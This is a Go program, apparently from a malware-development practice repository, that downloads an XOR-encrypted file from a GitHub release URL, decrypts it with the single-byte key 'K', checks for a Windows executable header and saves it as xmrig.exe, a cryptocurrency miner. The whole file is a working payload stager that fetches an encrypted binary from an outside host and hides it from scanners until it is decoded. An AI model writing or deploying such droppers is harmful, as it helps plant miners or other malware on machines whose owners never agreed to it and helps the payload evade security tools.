package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

func main() {
	fmt.Println("[+] Download and Decrypt to EXE")

	// Download URL
	url := "https://github.com/ALLann123/maldev/releases/download/0.1.2/xmrig.bin"
	encryptedFile := "xmrig_encrypted.bin"
	decryptedFile := "xmrig.exe"

	fmt.Printf("[+] Downloading from: %s\n", url)

	// Download the file
	if err := downloadFile(encryptedFile, url); err != nil {
		log.Fatalf("[-] Download failed: %v", err)
	}

	fmt.Printf("[+] Downloaded to: %s\n", encryptedFile)

	// Read encrypted file
	encryptedData, err := os.ReadFile(encryptedFile)
	if err != nil {
		log.Fatalf("[-] Failed to read encrypted file: %v", err)
	}

	fmt.Printf("[+] Read %d bytes\n", len(encryptedData))

	// Show first few bytes before decryption
	fmt.Printf("[+] First 8 bytes (encrypted): %x\n", encryptedData[:8])

	// Decrypt with XOR
	decryptedData := decryptXor(encryptedData, "K")

	// Show first few bytes after decryption
	fmt.Printf("[+] First 8 bytes (decrypted): %x\n", decryptedData[:8])

	// Check if it has MZ header (PE file)
	if len(decryptedData) >= 2 && decryptedData[0] == 0x4D && decryptedData[1] == 0x5A {
		fmt.Println("[+] SUCCESS! Valid MZ header found - this is a PE file")
	} else {
		fmt.Println("[-] WARNING: No MZ header found - may not be a valid executable")
	}

	// Save as .exe
	if err := os.WriteFile(decryptedFile, decryptedData, 0755); err != nil {
		log.Fatalf("[-] Failed to write decrypted file: %v", err)
	}

	fmt.Printf("[+] Decrypted file saved as: %s\n", decryptedFile)
	fmt.Println("[+] Done!")
}

func downloadFile(filepath string, url string) error {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func decryptXor(encryptedData []byte, key string) []byte {
	decrypted := make([]byte, len(encryptedData))
	keyBytes := []byte(key)

	for i := 0; i < len(encryptedData); i++ {
		decrypted[i] = encryptedData[i] ^ keyBytes[i%len(keyBytes)]
	}

	return decrypted
}
